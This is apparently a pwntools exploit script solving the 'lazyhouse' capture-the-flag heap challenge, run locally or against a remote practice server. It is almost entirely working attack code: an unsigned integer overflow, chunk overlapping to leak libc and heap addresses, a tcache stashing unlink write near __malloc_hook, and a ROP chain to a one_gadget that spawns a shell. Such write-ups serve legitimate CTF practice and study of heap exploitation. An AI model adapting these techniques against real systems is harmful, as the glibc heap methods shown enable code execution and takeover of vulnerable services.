from pwn import *
context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

def debug_on():
	context.log_level = "debug"

g_fname = "./lazyhouse"
g_elf = ELF(g_fname)
g_libcname = "/lib/x86_64-linux-gnu/libc-2.29.so"

if (LOCAL):
	g_io = process(g_fname)
	g_libc = g_elf.libc
else:
	g_io = remote("node3.buuoj.cn", 27650)
	g_libc = ELF(g_libcname)

def getpid():
	if (DEBUG & LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
	sla("choice: ", str(idx))

def new(idx, size, content):
	opt(1)
	sla("Index:", str(idx))
	sla("Size:", str(size))
	sa("House:", content)

def show(idx):
	opt(2)
	sla("Index:", str(idx))

def delete(idx):
	opt(3)
	sla("Index:", str(idx))
	
def edit(idx, content):
	opt(4)
	sla("Index:", str(idx))
	sa("House:", content)

def backdoor(content):
	opt("5")
	s(content)

def uint_overflow():
	opt(1)
	sla("Index:", "0")
	sla("Size:", str(2**64//218 + 1))
	delete(0)

def pwn():
	# increase money
	uint_overflow()

	#######################
	# leak libc & heap base
	#######################
	for i in range(7):
		new(0, 0xf0, "aaa")
		delete(0)
	new(0, 0xf0, "chk_1")
	new(1, 0xf0, "chk_2, trigger")
	new(2, 0xf0, "chk_3, victim")
	new(3, 0x210, "chk_4, victim")

	# extends chunk forward (to higher address)
	edit(0, flat(['a'*0xf0, 0x100, 0x421]))
	
	# prepare for tcache stashing unlink
	# because we need tcache[0x220].counts==5 and 2 chunks[0x220] in smallbin, we must use 
	# split bigger remainder chunk to insert chunks[0x220] into smallbin
	for i in range(5):
		new(4, 0x210, "chunk[0x220] to fill tcache")
		delete(4)
	new(4, 0x620, "to be split")
	new(5, 0x80, "guard")
	delete(4)
	new(4, 0x400, "make remainder[0x220]")
	new(6, 0x400, "make chk[0x220] insert into smallbin")

	# trigger extending
	delete(1) # now we have ub->chk[0x420]->ub
	delete(0) # make slot[0] useable
	delete(5) # make slot[5] useable

	new(0, 0x230, flat(["leak libc".ljust(0x200), 0x100, 0x101]))
	show(2)
	ru(p64(0x2e1))
	libc_base = u64(rl()[:8]) - 96 - 0x1e4c40
	g_libc.address = libc_base
	log.success("libc@%#x", libc_base)

	new(1, 0xb0, "leak heap base")
	delete(1)
	show(2)
	ru(flat(0xc1, 0))
	tcache_key = u64(rl()[:8])
	heap_base = tcache_key - 0x10
	log.success("heap@%#x\ntcache_key=%#x", heap_base, tcache_key)

	# alloc a big chunk, make chk[0x220] into smallbin	
	new(1, 0x400, "make 2nd chk[0x220] into smallbin")
	
	fake_bk = g_libc.symbols["__malloc_hook"] - 0x38
	edit(3, flat([heap_base + 0x1d20 ,fake_bk]))

	one_gadget = libc_base + 0xe21d1 # r15 == NULL && rdx == 0
	p_rdx = libc_base + 0x12bda6 # pop rdx; ret
	p_r15 = libc_base + 0x26541 # pop r15; ret
	leave = libc_base + 0x58373 # leave; ret
	rop = flat([
		0xdeadbeef,
		p_rdx, 0,
		p_r15, 0,
		one_gadget
	])
	
	new(7, 0x210, rop + b"trigger tcache stashing unlink")
	backdoor(flat('a'*0x28, leave))
	getpid()

	# getshell
	opt(1)
	sla("Index:", "5")
	sla("Size:", str(heap_base + 0x1d30))

if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive("leo^^$")
